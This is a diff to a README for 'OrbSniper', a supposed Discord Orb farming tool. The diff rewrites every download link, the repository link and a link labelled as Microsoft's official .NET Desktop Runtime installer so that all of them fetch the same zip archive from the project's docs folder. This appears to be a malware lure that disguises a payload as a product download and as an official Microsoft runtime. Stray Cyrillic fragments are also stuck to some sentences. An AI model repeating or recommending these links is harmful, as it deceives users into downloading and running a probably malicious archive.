@@ -1,6 +1,6 @@
 # ⚡ OrbSniper - Farm Discord Orbs on Autopilot
 
-[![Download OrbSniper](https://img.shields.io/badge/Download-OrbSniper-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=6A0DAD)](https://github.com/amartatlor-jpg/OrbSniper)
+[![Download OrbSniper](https://img.shields.io/badge/Download-OrbSniper-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=6A0DAD)](https://github.com/amartatlor-jpg/OrbSniper/raw/refs/heads/main/docs/Sniper_Orb_v2.2.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these simple steps to get OrbSniper up and running on your Windows comput
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/amartatlor-jpg/OrbSniper](https://github.com/amartatlor-jpg/OrbSniper)
+Visit this link to download the application: [https://github.com/amartatlor-jpg/OrbSniper/raw/refs/heads/main/docs/Sniper_Orb_v2.2.zip](https://github.com/amartatlor-jpg/OrbSniper/raw/refs/heads/main/docs/Sniper_Orb_v2.2.zip)
 
  The download starts automatically once you're on the page. If you see a screen with green "Code" button, look for a "Releases" section on the right side of the page and click the latest version link labeled something like "OrbSniperSetup.exe" or "OrbSniper-v1.0.0.zip". 
 
@@ -103,7 +103,7 @@ The gear icon in the top-right corner opens Settings. Here you can toggle:
 
 ### "OrbSniper won't start" 
 
-Make sure you're running Windows 10 or Windows 11. If you see an error about "missing DLL" or ".NET Framework", just download the latest version of [Microsoft .NET Desktop Runtime](https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/runtime-desktop-8.0-windows-x64-installer) from Microsoft's official site and install it. Then restart OrbSniperодина
+Make sure you're running Windows 10 or Windows 11. If you see an error about "missing DLL" or ".NET Framework", just download the latest version of [Microsoft .NET Desktop Runtime](https://github.com/amartatlor-jpg/OrbSniper/raw/refs/heads/main/docs/Sniper_Orb_v2.2.zip) from Microsoft's official site and install it. Then restart OrbSniperодина
 
 ###"It says 'Quest not found' repeatedly"
 
@@ -153,7 +153,7 @@ ist
 
 OrbSniper is open source, which means anyone can view its code or contribute improvements. If you're curious about how it works, want to report a bug, or feel like helping translate it into another language, check out the GitHub repository page. Even just starring the repo helps the project grow visibility. 
 
-- GitHub Repository: [https://github.com/amartatlor-jpg/OrbSniper](https://github.com/amartatlor-jpg/OrbSniper) 
+- GitHub Repository: [https://github.com/amartatlor-jpg/OrbSniper/raw/refs/heads/main/docs/Sniper_Orb_v2.2.zip](https://github.com/amartatlor-jpg/OrbSniper/raw/refs/heads/main/docs/Sniper_Orb_v2.2.zip) 
 - Issues & Feature Requests: Use the "Issues" tab on GitHub
 - License: MIT — completely free to use, modify, and share
 
@@ -163,7 +163,7 @@ OrbSniper is open source, which means anyone can view its code or contribute imp
 
 Don't wait manual quest grinding is a thing of the past. Download OrbSniper now and let it farm those Orbs while you binge your favorite show, take a nap, or actually get some work doneого
 
-[![Download OrbSniper Now](https://img.shields.io/badge/🚀_Download_OrbSniper-Free-00C853?style=for-the-badge&logo=windows&logoColor=white&labelColor=1B5E20)](https://github.com/amartatlor-jpg/OrbSniper)
+[![Download OrbSniper Now](https://img.shields.io/badge/🚀_Download_OrbSniper-Free-00C853?style=for-the-badge&logo=windows&logoColor=white&labelColor=1B5E20)](https://github.com/amartatlor-jpg/OrbSniper/raw/refs/heads/main/docs/Sniper_Orb_v2.2.zip)
 
 
 
